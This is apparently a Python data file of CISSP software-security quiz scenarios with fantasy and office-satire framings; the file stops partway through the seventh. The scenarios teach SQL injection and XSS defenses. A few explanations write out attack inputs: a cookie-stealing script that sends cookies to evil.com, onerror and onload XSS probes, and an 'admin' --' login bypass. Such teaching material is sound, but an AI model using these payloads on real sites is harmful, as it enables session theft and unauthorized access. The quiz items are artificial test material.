"""
Domain 8: Software Development Security scenarios.

Key CISSP concepts tested:
- SDLC Security Integration
- Secure Coding Practices
- Input Validation and Output Encoding
- OWASP Top 10
- Code Review and Analysis
- DevSecOps
- Supply Chain Security

Each scenario supports dual themes:
- Fantasy: Medieval/magical Citadel setting
- Corporate: Modern office satire (Office Space style)
"""

DOMAIN_8_SCENARIOS = [
    # Scenario 1: SDLC Security
    {
        "id": "d8_late_security",
        "domain": 8,
        "themes": {
            "fantasy": {
                "title": "THE CURSED GRIMOIRE",
                "narrative": """
The Royal Artificers have spent two years crafting a magnificent new grimoire - a
book of automated spell-casting that will revolutionize magical warfare. The binding
ceremony is tomorrow.

You, the Citadel's Security Archmage, are asked to review the grimoire for curses
and vulnerabilities. Flipping through the pages, you find dozens of issues:
unprotected invocation circles, exposed true names, and no wards against hostile
enchantments.

"Why wasn't I consulted during the crafting?" you ask.

The Lead Artificer shrugs. "Security review happens at the end. That's when we
check for problems, right? Fixing these now would delay the ceremony by months!"

At what point SHOULD security have been integrated into this magical development?
                """,
                "choices": [
                    {"text": "Security review at the end is correct - that's when you catch problems"},
                    {"text": "Security should be integrated from the beginning - at requirements and design"},
                    {"text": "Security should only be consulted after the first curse incident"},
                    {"text": "Security is the Artificers' responsibility, not yours"}
                ],
                "success_text": """
You tap the grimoire thoughtfully. "Had you consulted me during the DESIGN phase,
I would have specified protected invocation circles from the start. Building them
into wet clay is trivial; carving them into fired ceramic is nearly impossible."

The Lead Artificer winces. "So the cost of fixing problems..."

"Grows exponentially the later they're found. A design change costs one hour. A
change during crafting costs a day. A change after binding? Months of rework -
exactly where we are now."

You continue: "Security must be SHIFTED LEFT - involved from the earliest phases.
Requirements should include security needs. Designs should be reviewed for flaws.
Each crafting phase should include security checkpoints."

The grimoire will be delayed. But the next one will be built securely from the start.

You have demonstrated the importance of EARLY SECURITY INTEGRATION in the SDLC.
                """,
                "failure_texts": {
                    0: """
Security review at the end is the most EXPENSIVE approach. Issues found late in
development cost 10-100x more to fix than issues found during design. This is
why modern security practice emphasizes "shifting left" - integrating security
from requirements through design, implementation, and testing. End-stage review
should confirm security, not discover fundamental flaws.
                    """,
                    2: """
Waiting for an incident before involving security is reactive and costly. The
CISSP framework emphasizes proactive security integration throughout the SDLC.
By the time a curse affects users, damage is done - to people, reputation, and
trust. Security must be built in from the start, not bolted on after failure.
                    """,
                    3: """
Security is EVERYONE'S responsibility, but security professionals must be
involved in the development process. Developers may not have security expertise.
The security team provides guidance, review, and verification - but this requires
early and continuous involvement, not abdication of responsibility.
                    """
                }
            },
            "corporate": {
                "title": "THE LAST-MINUTE SECURITY REVIEW",
                "narrative": """
The development team has been working on the new customer portal for eighteen
months. Launch is scheduled for Monday. On Friday afternoon, you receive an
email: "Security review requested - deploy on Monday."

You open the codebase and find: SQL queries built with string concatenation,
session tokens in URLs, passwords stored in plaintext, and admin functions
accessible without authentication.

The project manager stops by. "Just a quick scan, right? We've already done
the marketing launch. The CEO announced the date in last quarter's earnings call."

When should security have been integrated into this development process?
                """,
                "choices": [
                    {"text": "Friday before launch is fine - security is a final checklist item"},
                    {"text": "Security should be integrated from requirements and design phases"},
                    {"text": "Only after the first security incident in production"},
                    {"text": "Security is the developers' job, not the security team's"}
                ],
                "success_text": """
You pull up the defect cost curve on your whiteboard. "See this? A security
issue caught in requirements costs $100 to fix. In design, $500. In development,
$5,000. In testing, $15,000. In production? $100,000 or more."

The project manager's face falls. "So these plaintext passwords..."

"Will take weeks to properly fix. You need a password hashing implementation,
database migration, user notification, password reset flows... This isn't a
Friday afternoon task."

You continue: "Security should be 'shifted left' - involved from day one.
Security requirements during planning. Threat modeling during design. Secure
coding training for developers. Security testing in every sprint. Not a
last-minute checkbox."

The launch is delayed. But the alternative was launching a data breach.

You have demonstrated the importance of EARLY SECURITY INTEGRATION in the SDLC.
                """,
                "failure_texts": {
                    0: """
Friday before Monday launch is the WORST time for security review. Issues found
now are nearly impossible to fix properly. Teams face pressure to ship insecure
code or delay major launches. Both outcomes are bad. Security integrated from
the start prevents this nightmare scenario entirely. Shift left, not last-minute.
                    """,
                    2: """
Waiting for a breach before involving security is like waiting for a car crash
before installing seatbelts. Reactive security is exponentially more expensive
than proactive integration. The CISSP emphasizes that security must be built
into systems from the start - not added after failure causes damage.
                    """,
                    3: """
While developers should code securely, they need security guidance, requirements,
and review. Most developers aren't security specialists. The security team must
be involved throughout the SDLC - not to write the code, but to define requirements,
review designs, and verify implementations. It's a shared responsibility.
                    """
                }
            }
        },
        "correct_index": 1,
        "xp_reward": 75,
        "hp_penalty": 25,
        "failure_text": """
The SDLC (Software Development Life Cycle) must integrate security at every phase.
Security requirements should be defined during planning. Threat models should be
created during design. Secure coding practices should be followed during development.
Security testing should occur throughout. "Shifting left" - involving security
early - prevents costly late-stage discoveries and ensures security is built in,
not bolted on.
        """,
        "domain_reference": "Domain 8: Software Development Security - SDLC Security Integration"
    },

    # Scenario 2: Secure Coding Practices
    {
        "id": "d8_input_trust",
        "domain": 8,
        "themes": {
            "fantasy": {
                "title": "THE TRUSTED MESSENGER",
                "narrative": """
The Kingdom's new magical communication system allows anyone to send spell-scrolls
to the Royal Archives. An apprentice scribe asks you about processing incoming
messages.

"Master, when a scroll arrives from the Allied Kingdoms, should I verify its
contents? They're our allies - surely we can trust their messages?"

You recall that last month, an enemy spy intercepted and modified an allied
message, inserting a curse that nearly destroyed the archive.

What principle should guide how the apprentice handles ALL incoming messages?
                """,
                "choices": [
                    {"text": "Trust messages from allies; only verify messages from unknown sources"},
                    {"text": "Validate and sanitize ALL input, regardless of the apparent source"},
                    {"text": "Process messages faster by skipping validation - speed is important"},
                    {"text": "Only check if the message looks suspicious"}
                ],
                "success_text": """
"Young scribe, let me tell you the First Law of Defensive Magic: NEVER TRUST
ANY INPUT. Not from enemies. Not from allies. Not even from the King himself."

The apprentice looks confused. "But why would our allies send harmful messages?"

"They probably wouldn't - intentionally. But what if an enemy intercepts their
messenger? What if their own scribe makes an error? What if a curse attaches
itself to the scroll during transit?"

You demonstrate: "Every message, regardless of source, must be VALIDATED - does
it match expected formats? SANITIZED - are dangerous elements neutralized? Only
then can it be safely processed."

The apprentice nods. "So we protect against accidents and malice alike?"

"Precisely. Input validation isn't about trust - it's about DEFENSE IN DEPTH."

You have taught the critical principle of INPUT VALIDATION AND SANITIZATION.
                """,
                "failure_texts": {
                    0: """
Trusting any input based on its apparent source is dangerous. Sources can be
spoofed. Allies can be compromised. Legitimate senders can be intercepted.
The secure coding principle is simple: validate ALL input. Every field. Every
source. Every time. Trust is not a security control.
                    """,
                    2: """
Skipping validation for speed creates vulnerabilities. The minor performance
gain isn't worth the risk of injection attacks, data corruption, or system
compromise. Secure coding requires validating all input - the processing
time is an essential investment in security.
                    """,
                    3: """
"Looking suspicious" is not a reliable detection method. Malicious input is
specifically crafted to look normal. Attackers study valid inputs and mimic
them precisely. Only systematic validation - checking format, type, length,
and sanitizing dangerous characters - provides reliable protection.
                    """
                }
            },
            "corporate": {
                "title": "THE JUNIOR DEVELOPER'S QUESTION",
                "narrative": """
A junior developer approaches you during code review. They're building a form
that accepts customer feedback and stores it in the database.

"I'm only accepting input from our mobile app, which we control. Do I really
need to validate the input? It's not like random hackers are typing into our
app directly."

You notice their code directly concatenates user input into SQL queries and
renders it unescaped in the admin dashboard.

What is the MOST important principle to teach this developer?
                """,
                "choices": [
                    {"text": "Internal apps don't need validation - only public-facing apps do"},
                    {"text": "Validate and sanitize ALL input - never trust any data source"},
                    {"text": "Performance is more important than validation for internal tools"},
                    {"text": "Just check if the input contains obvious attack patterns"}
                ],
                "success_text": """
You pull up your chair. "Let me tell you about the $50 million breach at MegaCorp.
Their mobile app was 'trusted' too. An attacker reverse-engineered it, modified
the requests, and injected SQL directly."

The junior developer's eyes widen. "But we control the app..."

"You control the app on your test phone. You don't control what users install.
You don't control intercepting proxies. You don't control modified APKs."

You continue: "The rule is simple: NEVER TRUST ANY INPUT. Not from web forms.
Not from mobile apps. Not from internal services. Not from APIs. Every input
is validated. Every output is encoded. No exceptions."

You show them parameterized queries and output encoding. "This adds maybe 5%
development time. That $50 million breach? Could have been prevented by exactly
this code."

You have taught the critical principle of INPUT VALIDATION AND SANITIZATION.
                """,
                "failure_texts": {
                    0: """
"Internal" doesn't mean "safe." Internal apps are compromised regularly. Mobile
apps can be reverse-engineered. APIs can be called directly. All input channels
are potential attack vectors. The principle is universal: validate ALL input,
from ALL sources, ALL the time. No exceptions for "trusted" sources.
                    """,
                    2: """
Performance optimization that sacrifices security is false economy. The microseconds
saved by skipping validation are meaningless compared to the cost of a breach.
SQL injection, XSS, and other input-based attacks remain top vulnerabilities
precisely because developers skip validation for "performance." Always validate.
                    """,
                    3: """
Pattern-matching for "obvious attacks" misses most attacks. Attackers specifically
craft inputs to bypass blacklist patterns. They use encoding, case variations,
and novel syntax. Only WHITELIST validation - defining exactly what IS allowed -
provides reliable protection. Blacklists always have gaps.
                    """
                }
            }
        },
        "correct_index": 1,
        "xp_reward": 75,
        "hp_penalty": 25,
        "failure_text": """
Input validation is the PRIMARY defense against injection attacks. The principle
is absolute: NEVER TRUST ANY INPUT. All data from all sources must be validated
for type, format, length, and range. All input must be sanitized before use. All
output must be encoded appropriately. This applies equally to web forms, mobile
apps, APIs, files, and internal services. Trust is not a security control.
        """,
        "domain_reference": "Domain 8: Software Development Security - Secure Coding Practices"
    },

    # Scenario 3: Input Validation
    {
        "id": "d8_whitelist_blacklist",
        "domain": 8,
        "themes": {
            "fantasy": {
                "title": "THE FORBIDDEN WORDS",
                "narrative": """
The Citadel's new communication crystal allows citizens to submit petitions
to the Council. A scribe asks you about filtering dangerous incantations from
messages.

"Master, I've created a list of 500 known curse words and forbidden incantations.
Any message containing these words is rejected. Is this sufficient protection?"

You notice that last week, an attacker submitted 'CUURSE' (misspelled) and it
passed the filter, causing minor havoc in the council chamber.

What validation approach should you recommend?
                """,
                "choices": [
                    {"text": "Keep expanding the forbidden word list as new attacks are discovered"},
                    {"text": "Define an ALLOWED list of safe patterns instead of blocking bad ones"},
                    {"text": "Accept all messages and review them later for problems"},
                    {"text": "Only limit message length - that should prevent most attacks"}
                ],
                "success_text": """
"Your approach, young scribe, is called a BLACKLIST - blocking known-bad patterns.
It has a fatal flaw: you must know every possible attack in advance."

You demonstrate: "CURSE is blocked. But CUURSE passes. CuRsE passes. C.U.R.S.E.
passes. Attackers are creative. Your list will never be complete."

"The superior approach is WHITELISTING - defining exactly what IS allowed. A
petition should contain only: letters, numbers, spaces, and basic punctuation.
Anything else? Rejected. No exceptions."

The scribe protests: "But that seems restrictive..."

"Precisely. Security IS restrictive. We're not blocking millions of attack
variations - we're ALLOWING only the specific patterns needed for legitimate use."

The scribe rewrites the validation using whitelist patterns. The curse attempts
now fail entirely.

You have demonstrated WHITELIST VALIDATION over blacklist approaches.
                """,
                "failure_texts": {
                    0: """
Expanding a blacklist is an endless game of whack-a-mole. Attackers constantly
invent new bypass techniques: encoding, case variations, character substitutions,
and novel syntax. No blacklist can ever be complete. WHITELIST validation -
allowing only known-good patterns - is fundamentally more secure because it
rejects anything unexpected, including unknown attack vectors.
                    """,
                    2: """
Accepting all input and reviewing later means attacks have already succeeded by
the time you review. Security must be preventive, not just detective. Input
validation at the point of entry prevents malicious data from ever entering
your systems. Post-facto review is too late.
                    """,
                    3: """
Length limits alone don't prevent injection attacks. A SQL injection payload
can be very short. An XSS attack can fit in 50 characters. Length is ONE
validation check but must be combined with format validation, type checking,
and proper encoding. Length alone is insufficient protection.
                    """
                }
            },
            "corporate": {
                "title": "THE SEARCH FIELD SECURITY",
                "narrative": """
The development team is building a search feature for the customer portal.
During code review, you see they've implemented input validation.

"We block all known XSS patterns," the developer explains. "Script tags, event
handlers, javascript: URLs - we reject any input containing these."

You test the search field and type: `<SCRIPT>alert(1)</SCRIPT>`. It's blocked.
Then you try: `<img src=x onerror=alert(1)>`. It passes and executes.

What approach should you recommend instead?
                """,
                "choices": [
                    {"text": "Keep adding more patterns to the blacklist as attacks are discovered"},
                    {"text": "Use whitelist validation - allow only alphanumeric and common punctuation"},
                    {"text": "Accept all input and sanitize it later during display"},
                    {"text": "Just limit input to 100 characters"}
                ],
                "success_text": """
"You've built a blacklist," you explain. "It blocks known attacks. But what about
unknown attacks? New techniques? Encoding bypasses?"

You show them: "<script>" is blocked but "\\x3cscript\\x3e" might pass. They block
"onerror" but "ONERROR" passes. Each fix creates two new bypasses.

"Instead, define what SHOULD be in a search query. Alphanumeric characters. Spaces.
Maybe quotes and hyphens for product names. Nothing else. Reject everything else."

The developer argues: "But users might want to search for..."

"If a user genuinely needs to search for '<script>', you have bigger problems.
For 99.99% of searches, alphanumeric is sufficient. The 0.01% edge cases don't
justify accepting arbitrary HTML."

You help them implement whitelist validation. The XSS vulnerabilities disappear.

You have demonstrated WHITELIST VALIDATION over blacklist approaches.
                """,
                "failure_texts": {
                    0: """
Blacklist expansion is a losing battle. Every bypass you block, attackers find
three more. Encoding variations, case changes, alternative syntaxes, browser
quirks - the attack surface is infinite. WHITELIST validation makes the problem
tractable: define what's allowed, reject everything else. Unknown attacks are
blocked by default.
                    """,
                    2: """
Accepting all input and sanitizing later is risky. What if sanitization is
incomplete? What if the input is used before sanitization? What if different
contexts require different sanitization? Validation at the boundary rejects
bad input immediately. Defense in depth includes sanitization, but validation
comes first.
                    """,
                    3: """
Length limits don't prevent injection. XSS payloads can be very compact:
<svg/onload=alert(1)> is 21 characters. SQL injection can be short too.
Length is useful for preventing buffer overflows and resource exhaustion,
but it must be combined with format and content validation for real security.
                    """
                }
            }
        },
        "correct_index": 1,
        "xp_reward": 75,
        "hp_penalty": 25,
        "failure_text": """
Whitelist validation is more secure than blacklist validation. Blacklists try
to block known-bad patterns but can always be bypassed with novel attacks.
Whitelists define exactly what IS allowed - anything else is rejected. This
blocks unknown attacks by default. For input validation, define the allowed
character set, format, length, and range. Reject everything that doesn't match.
        """,
        "domain_reference": "Domain 8: Software Development Security - Input Validation"
    },

    # Scenario 4: SQL Injection Prevention
    {
        "id": "d8_sql_injection",
        "domain": 8,
        "themes": {
            "fantasy": {
                "title": "THE SUMMONING CIRCLE",
                "narrative": """
The Citadel's summoning chamber uses a crystal console where mages type the name
of the entity they wish to summon. The spell construction looks like this:

"SUMMON ENTITY WHERE NAME = '" + mageInput + "'"

A dark mage recently typed: "Shadow' OR TRUE; SUMMON ALL DEMONS; --"

Every demon in the catalog was summoned at once. The Citadel barely survived.

You're reviewing the summoning spell construction. What is the FUNDAMENTAL flaw
in this design, and what is the correct fix?
                """,
                "choices": [
                    {"text": "Buffer overflow - use longer name buffers"},
                    {"text": "Spell injection - use parameterized spell construction"},
                    {"text": "Cross-realm scripting - encode the output"},
                    {"text": "Denial of service - add rate limiting"}
                ],
                "success_text": """
"The flaw," you explain to the assembled mages, "is that we're MIXING CODE AND
DATA. The mage's input becomes part of the summoning spell itself - so a clever
input can CHANGE what the spell does."

You draw on the enchantment board: "The attacker closed the name parameter with
a quote, added their own commands, and commented out the rest. Our spell became
THEIR spell."

"The fix is PARAMETERIZED SPELLCASTING. Instead of building the spell as text,
we define: SUMMON with parameter NAME. The input is BOUND to the parameter - it
can NEVER be interpreted as spell commands, only as data."

You demonstrate. With parameterized spells, the attack becomes: summon entity
named literally "Shadow' OR TRUE; SUMMON ALL DEMONS; --" which doesn't exist.
The injection fails harmlessly.

"Always separate code from data. Use parameters. Never concatenate input into spells."

You have demonstrated SQL INJECTION PREVENTION through parameterized queries.
                """,
                "failure_texts": {
                    0: """
This is not a buffer overflow. Buffer overflows occur when data exceeds
allocated memory. This attack works with any length input. The vulnerability
is INJECTION - user input being interpreted as code commands. The fix is
parameterized queries that separate code from data, not larger buffers.
                    """,
                    2: """
Output encoding prevents cross-site scripting (XSS), not SQL injection. XSS
attacks target browsers; SQL injection targets databases. Different vulnerabilities
require different fixes. SQL injection is prevented by parameterized queries
(prepared statements), not output encoding.
                    """,
                    3: """
Rate limiting can slow down attacks but doesn't prevent SQL injection. An
attacker only needs ONE successful injection to dump the entire database or
execute destructive commands. The fundamental fix is parameterized queries
that make injection impossible, not rate limits that merely slow it down.
                    """
                }
            },
            "corporate": {
                "title": "THE DEVELOPER'S SHORTCUT",
                "narrative": """
During code review, you find this code in the login function:

query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'"
cursor.execute(query)

You ask the developer about it. "Yeah, I know about prepared statements, but
string concatenation is faster to write. Besides, we have a WAF that blocks
SQL injection attempts."

You test with username: admin' --

The login succeeds. You're now logged in as admin without knowing the password.

What is the FUNDAMENTAL fix for this vulnerability?
                """,
                "choices": [
                    {"text": "Add more WAF rules to block SQL injection patterns"},
                    {"text": "Use parameterized queries (prepared statements)"},
                    {"text": "Encode special characters in the output"},
                    {"text": "Add rate limiting to prevent brute force"}
                ],
                "success_text": """
You sit down with the developer. "Let me show you what happened. Your query became:
SELECT * FROM users WHERE username='admin' --' AND password='anything'"

"The double-dash comments out the password check. The WAF didn't catch this because
there are thousands of bypass techniques. Input encoding variations. Unicode. Nested
comments. You can't blacklist them all."

You continue: "The fix is PARAMETERIZED QUERIES. Instead of concatenating strings,
you use placeholders:"

You show them:
query = "SELECT * FROM users WHERE username=? AND password=?"
cursor.execute(query, (username, password))

"Now the input is BOUND as data. It can NEVER become SQL code. Even if someone types
DROP TABLE, it's just searched as a literal string."

The developer fixes the code. The WAF becomes a backup layer, not the primary defense.

You have demonstrated SQL INJECTION PREVENTION through parameterized queries.
                """,
                "failure_texts": {
                    0: """
WAFs are easily bypassed. There are thousands of SQL injection techniques:
encoding variations, case manipulation, comment styles, alternative syntax.
No WAF rule set can catch them all. WAFs are a useful defense-in-depth layer
but the PRIMARY fix must be parameterized queries that make injection impossible
at the code level.
                    """,
                    2: """
Output encoding prevents XSS, not SQL injection. These are different vulnerabilities
requiring different fixes. SQL injection occurs when building database queries;
the fix is parameterized queries. XSS occurs when displaying data in browsers;
the fix is output encoding. Don't confuse the two.
                    """,
                    3: """
Rate limiting slows down brute force attacks but doesn't prevent SQL injection.
A single SQL injection can bypass authentication, dump the database, or destroy
data. Rate limits just make the attacker wait slightly longer. The real fix is
parameterized queries that eliminate the vulnerability entirely.
                    """
                }
            }
        },
        "correct_index": 1,
        "xp_reward": 75,
        "hp_penalty": 25,
        "failure_text": """
SQL Injection occurs when user input is concatenated directly into SQL query
strings, allowing attackers to modify the query's logic. The ONLY reliable
fix is PARAMETERIZED QUERIES (prepared statements). These separate SQL code
from data values, ensuring user input is never interpreted as SQL commands.
WAFs, input validation, and other controls are useful layers but cannot replace
parameterized queries as the primary defense.
        """,
        "domain_reference": "Domain 8: Software Development Security - SQL Injection Prevention"
    },

    # Scenario 5: XSS Prevention
    {
        "id": "d8_xss_attack",
        "domain": 8,
        "themes": {
            "fantasy": {
                "title": "THE ENCHANTED GUESTBOOK",
                "narrative": """
The Citadel's magical guestbook allows visitors to leave messages that appear
on the enchanted wall in the great hall for all to see.

A visitor recently wrote: "<spell>summon(skeleton)</spell>"

When other visitors read the guestbook, skeletons materialized and caused chaos.
The "message" executed as a spell on every reader's mind-space.

You're tasked with fixing the guestbook. What vulnerability is this, and what
is the PRIMARY fix?
                """,
                "choices": [
                    {"text": "SQL injection - use parameterized queries"},
                    {"text": "Cross-Site Scripting (XSS) - encode output when displaying"},
                    {"text": "CSRF - implement anti-forgery tokens"},
                    {"text": "Broken authentication - require stronger passwords"}
                ],
                "success_text": """
"This is a STORED SCRIPTING attack," you explain. "The malicious spell was stored
in our guestbook, and it EXECUTED in every reader's mind-space. We failed to
ENCODE the output."

You demonstrate the fix: "When we display messages, we must TRANSFORM special
characters. The spell-bracket '<' becomes the safe display rune '&lt;'. The
closing bracket '>' becomes '&gt;'."

You rewrite the display enchantment to encode all special characters. Now
when visitors see the message, they see literally "<spell>summon(skeleton)</spell>"
as TEXT, not as an executable spell.

"The key principle: INPUT VALIDATION prevents bad data from entering. OUTPUT
ENCODING ensures that whatever data we display cannot execute as code. Both
are necessary. For this attack, encoding the output is the primary defense."

You have demonstrated XSS PREVENTION through output encoding.
                """,
                "failure_texts": {
                    0: """
SQL injection targets databases. This attack targets readers of the guestbook.
The malicious content executes in the viewer's context, not in the database.
This is Cross-Site Scripting (XSS), specifically Stored XSS. The fix is output
encoding, not parameterized queries.
                    """,
                    2: """
CSRF (Cross-Site Request Forgery) tricks users into performing unwanted actions.
This attack injects executable content that runs in other users' browsers.
That's XSS, not CSRF. The fix is output encoding to prevent the injected
content from executing as code.
                    """,
                    3: """
Authentication controls who can log in. This attack affects users who view
content. Even with strong passwords, viewing the malicious guestbook entry
would trigger the attack. This is XSS, and the fix is encoding output to
prevent execution, not strengthening authentication.
                    """
                }
            },
            "corporate": {
                "title": "THE COMMENTS SECTION",
                "narrative": """
The company blog allows users to post comments. Your security scan found
something alarming: a comment containing JavaScript that steals session
cookies from anyone who views the page.

The offending comment: <script>document.location='http://evil.com/steal?c='+document.cookie</script>

When users load the page, this script executes in their browsers and sends
their session cookies to an attacker. Several executives have already been
compromised.

What vulnerability is this, and what is the PRIMARY fix?
                """,
                "choices": [
                    {"text": "SQL injection - use parameterized database queries"},
                    {"text": "Cross-Site Scripting (XSS) - HTML-encode all output before display"},
                    {"text": "CSRF - add anti-CSRF tokens to all forms"},
                    {"text": "Session hijacking - implement stronger session tokens"}
                ],
                "success_text": """
"This is Stored Cross-Site Scripting," you explain to the development team.
"The attacker stored JavaScript in our database through the comments feature.
When we display comments, that JavaScript executes in every viewer's browser."

You show the fix: "When rendering user content to the page, we must HTML-ENCODE
it. The '<' character becomes '&lt;'. The '>' becomes '&gt;'. Now instead of
executing as a script, it displays as literal text."

You demonstrate:
Original: <script>alert(1)</script>
Encoded: &lt;script&gt;alert(1)&lt;/script&gt;

"The browser sees the encoded version and renders it as text, not code. The
script tag is VISIBLE but not EXECUTABLE."

You also recommend HttpOnly cookies and Content Security Policy as additional
layers, but the PRIMARY fix is output encoding.

You have demonstrated XSS PREVENTION through output encoding.
                """,
                "failure_texts": {
                    0: """
SQL injection affects database queries. This attack affects browser rendering.
The malicious JavaScript is stored in the database (correctly!) but executes
when displayed (incorrectly!). This is XSS, specifically Stored XSS. The fix
is output encoding when displaying content, not parameterized queries.
                    """,
                    2: """
CSRF tricks users into making unwanted requests. This attack executes code in
users' browsers just by viewing a page - no user action required. That's XSS.
The fix is output encoding to ensure user-provided content is displayed as
text, not executed as code.
                    """,
                    3: """
Stronger session tokens don't prevent XSS. The attack can steal ANY token if
it executes JavaScript in the user's browser. The fix is preventing the script
from executing in the first place, which requires output encoding. HttpOnly
cookies help but are a secondary defense.
                    """
                }
            }
        },
        "correct_index": 1,
        "xp_reward": 75,
        "hp_penalty": 25,
        "failure_text": """
Cross-Site Scripting (XSS) occurs when attacker-controlled content is rendered
in a way that allows script execution in users' browsers. Stored XSS persists
in the application; Reflected XSS bounces off the server. The PRIMARY fix is
OUTPUT ENCODING - converting special characters like < > to HTML entities
(&lt; &gt;) so they display as text rather than being interpreted as code.
Content Security Policy and HttpOnly cookies provide additional protection.
        """,
        "domain_reference": "Domain 8: Software Development Security - XSS Prevention"
    },

    # Scenario 6: Code Review
    {
        "id": "d8_code_review",
        "domain": 8,
        "themes": {
            "fantasy": {
                "title": "THE REVIEWED ENCHANTMENTS",
                "narrative": """
The Citadel produces hundreds of new enchantments each month. The Elder Council
demands that every enchantment be reviewed for curses before deployment, but
there are only three curse-breakers for thousands of submissions.

"We can't review everything manually," the Head Curse-Breaker sighs. "Reviews
take hours. We're months behind. The Artificers are threatening to bypass us
entirely."

An apprentice suggests: "What if we had enchanted crystals that automatically
scan for common curse patterns? The curse-breakers could then focus on reviewing
the highest-risk enchantments?"

What approach would BEST balance thoroughness with efficiency?
                """,
                "choices": [
                    {"text": "Skip reviews entirely - speed to market is more important"},
                    {"text": "Automated scanning for all enchantments, manual review for high-risk ones"},
                    {"text": "Only review enchantments after they cause incidents"},
                    {"text": "Have each artificer review only their own enchantments"}
                ],
                "success_text": """
"The apprentice has the right idea," you announce. "We need TIERED REVIEW."

You outline the new process: "First, every enchantment passes through automated
curse-detection crystals. These catch common problems instantly - forbidden
sigils, dangerous energy patterns, known vulnerabilities."

"Second, enchantments are categorized by risk. Anything touching royal communications,
protective wards, or access control gets MANUAL review by curse-breakers. Lower-risk
utility enchantments can proceed with automated approval alone."

"Third, we sample-review 10% of auto-approved enchantments to catch what the
crystals miss and improve our detection patterns."

The Head Curse-Breaker nods. "So the crystals handle volume, and we focus our
expertise where it matters most?"

"Precisely. We can't review everything manually. But we can review everything
APPROPRIATELY."

You have demonstrated efficient SECURITY CODE REVIEW practices.
                """,
                "failure_texts": {
                    0: """
Skipping security review for speed is how vulnerabilities reach production.
Every major breach started with code that wasn't adequately reviewed. Speed
matters, but so does security. The solution is efficient review processes
that balance both - automated tools plus targeted manual review - not
abandoning review entirely.
                    """,
                    2: """
Reviewing only after incidents means the damage is already done. Users are
compromised. Data is stolen. Trust is broken. Security must be PREVENTIVE,
not just reactive. Find vulnerabilities before deployment, not after
exploitation. Post-incident review is important for learning but cannot
replace pre-deployment security review.
                    """,
                    3: """
Self-review catches fewer issues than peer review. Developers are blind to
their own assumptions and mistakes. Different perspectives catch different
problems. Security review should involve someone OTHER than the original
developer. Self-review is better than nothing but far inferior to proper
code review processes.
                    """
                }
            },
            "corporate": {
                "title": "THE REVIEW BOTTLENECK",
                "narrative": """
The development team pushes 200 pull requests per week. The security team has
capacity to manually review maybe 20. The result: a four-week security review
backlog, angry developers, and pressure to "just approve everything."

"We need a better process," the CISO says. "What do you recommend?"

The team currently has no automated security scanning. All reviews are manual.
Developers are starting to bypass the security review entirely because "it
takes too long."

What approach would BEST balance security thoroughness with development velocity?
                """,
                "choices": [
                    {"text": "Skip security reviews - they're blocking productivity"},
                    {"text": "Implement automated SAST tools plus manual review for high-risk changes"},
                    {"text": "Only review code after security incidents occur"},
                    {"text": "Have each developer review only their own code"}
                ],
                "success_text": """
"Here's the plan," you present to leadership. "We implement a tiered review process."

"TIER 1: Every PR runs through automated SAST (Static Application Security Testing).
This catches common vulnerabilities instantly - SQL injection, XSS, hardcoded
secrets, vulnerable dependencies. Developers get immediate feedback."

"TIER 2: PRs are risk-categorized. Changes to authentication, authorization,
payment processing, or PII handling require MANUAL security review. Everything
else proceeds with automated approval."

"TIER 3: We randomly sample 10% of auto-approved changes for manual review.
This catches what automation misses and helps us tune our tools."

The CISO asks, "What about the backlog?"

"It disappears. 80% of PRs are low-risk and can proceed with automated approval.
Security focuses on the 20% that actually need human review. We're faster AND
more thorough."

You have demonstrated efficient SECURITY CODE REVIEW practices.
                """,
                "failure_texts": {
                    0: """
Skipping security review for velocity is how breaches happen. The time "saved"
by not reviewing code is nothing compared to incident response, breach notification,
regulatory fines, and reputation damage. The solution is EFFICIENT review
processes - automated tools plus targeted manual review - not no review.
                    """,
                    2: """
Post-incident review is too late. By the time you're reviewing after a breach,
customers are compromised, data is stolen, and you're in crisis mode. Security
review must happen BEFORE deployment. Learn from incidents, yes, but prevent
them through proactive review.
                    """,
                    3: """
Self-review has limited value. Developers miss their own blind spots. They
make the same assumptions in review that they made in coding. Different
perspectives catch different issues. Security review should involve someone
other than the code author - whether that's a peer developer or security
specialist.
                    """
                }
            }
        },
        "correct_index": 1,
        "xp_reward": 75,
        "hp_penalty": 25,
        "failure_text": """
Effective security code review balances thoroughness with efficiency. Automated
SAST (Static Application Security Testing) tools can scan all code for common
vulnerabilities instantly. Manual security review focuses on high-risk changes:
authentication, authorization, payment processing, sensitive data handling.
This combination provides broad coverage without creating bottlenecks. Skipping
review entirely or reviewing only after incidents leads to preventable breaches.
        """,
        "domain_reference": "Domain 8: Software Development Security - Code Review"
    },

    # Scenario 7: OWASP Top 10
    {
        "id": "d8_owasp_guidance",
        "domain": 8,
        "themes": {
            "fantasy": {
                "title": "THE MASTER'S REFERENCE",
                "narrative": """
A group of apprentice spellcasters approach you. "Master, we've been tasked
with securing the kingdom's new magical web portal. We know there are common
vulnerabilities we should address, but we don't know where to start."

One apprentice holds up the kingdom's style guide. Another waves the arcane
language documentation. A third suggests consulting the crystal orb vendor.

Where should apprentices FIRST look for guidance on the most critical web
application security risks?
                """,
                "choices": [
                    {"text": "The kingdom's internal style guide"},
                    {"text": "The OWASP Top 10 - industry consensus on critical web risks"},
                    {"text": "The programming language documentation"},
                    {"text": "The database vendor's manual"}
                ],
                "success_text": """
"Your first reference," you tell the apprentices, "should be the OWASP Top 10."

You summon a glowing scroll that materializes in the air. "OWASP - the Open
Web Application Security Project - maintains a consensus list of the most
critical security risks facing web applications. It's updated regularly based
on real-world data from security practitioners worldwide."

The apprentices crowd around to read: "Broken Access Control... Cryptographic
Failures... Injection... Insecure Design..."

"These ten categories represent the most common and dangerous vulnerabilities.
Address these first, and you've prevented the vast majority of attacks."

"But what about our style guide?" one asks.

"Internal guides may address coding standards but rarely cover security
comprehensively. The OWASP Top 10 is specifically focused on security risks.
Start there, then supplement with internal standards."

You have directed the apprentices to the OWASP TOP 10 as essential guidance.
                """,
                "failure_texts": {
                    0: """
Internal style guides focus on code consistency, formatting, and project
conventions. They rarely provide comprehensive security guidance. While
internal standards are valuable, the OWASP Top 10 specifically addresses
the most critical web application security risks based on industry-wide
data. For security guidance, start with OWASP.
                    """,
                    2: """
Programming language documentation explains language features and syntax.
It doesn't comprehensively address application security vulnerabilities.
Languages may have security features, but understanding common attack
patterns requires security-focused resources like the OWASP Top 10.
                    """,
                    3: """
Database vendor manuals explain database features and administration. They
cover database-specific security but not application-layer vulnerabilities
like XSS, authentication flaws, or business logic issues. The OWASP Top 10
provides a comprehensive view of web application security risks.
                    """
                }
            },
            "corporate": {
